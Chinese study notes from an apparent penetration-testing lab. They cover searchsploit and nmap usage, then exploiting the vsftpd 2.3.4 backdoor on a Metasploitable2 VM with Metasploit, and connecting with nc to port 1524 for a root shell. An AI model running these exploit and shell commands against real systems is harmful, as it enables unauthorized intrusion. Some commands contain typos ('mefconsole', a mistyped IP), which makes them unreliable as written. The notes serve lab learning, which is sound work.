1.更新漏洞数据库
sudo searchsploit -u
检查版本 searchsploit -v
### 2.扫描目标ip的端口（发现目标）
nmap -sV -cC 191.168.100.101
3.扫描开放的端口
nmap -p 80,443,8080,8888 192.168.100.101
### 4.curl -I http://192.168.100.101/ 扫描出网站服务器类型apache 2.4.39（识别软件版本）
### searchsploit apache 2.4.39（查找漏洞)
![[Pasted image 20251129220119.png]]
主要漏洞类型
4.1远程代码执行 (RCE)攻击者可以再目标服务器上执行任意代码
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution
4.2路径遍历攻击：
Apache HTTP Server 2.4.49 - Path Traversal可以访问服务器上的敏感文件
4.3拒绝服务（Dos)
Apache CXF <2.5.10/2.6.7/2.7.4 - Denial of Service使服务崩溃或不可用
4.4权限提升：
Apache 2.4.17 < 2.4.38 - Local Privilege Escalation
4.5缓冲区溢出：
Apache mod_ssl < 2.8.7 OpenSSL - Remote Buffer Overflow 通过溢出获得系统控制权
5.searchsploit -m 编号（复制漏洞到当前目录）
searchsploit -x编号（查看漏洞详情）
searchsploit -p 编号（显示漏洞文件路径）
searchsploit -t  wordpress(只搜索标题)
searchsploit -j apache(json格式输出)
searchsploit -o apache（显示完整路径）
searchsploit -w apache(显示Exloit-DB网址)
cat 编号.py(查看利用代码使用方法)
##### 6.在Metasploitable2-Linux虚拟机中是使用searchsploit方法（还打开了Kali，操作都在Kali上完成）
6.1获得靶机IP：192.168.202.183
6.2 nmap -sV 192.168.202.183   
![[Pasted image 20251202152933.png]]
先找到vsftpd 2.3.4漏洞
![[Pasted image 20251202153151.png]]
searchsploit -p 17491 （查看）
 searchsploit -m 17491（复制）
 6.3利用漏洞开始攻击
 启用mefconsole框架输入：mefconsole
 搜索并选择模块：
 search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
 设置目标并攻击：
 set RHOSTS 192.168.202.183  # 设置为你靶机的IP
show options                # 查看其他需要设置的参数（这里通常只用设置RHOSTS）
exploit                     # 开始攻击
![[Pasted image 20251202153656.png]]
这样就已经有一个shell被打开
还可以输入nc 192.168.202.183 1524 开启一个端口让其监听连接后获得一个root权限的shell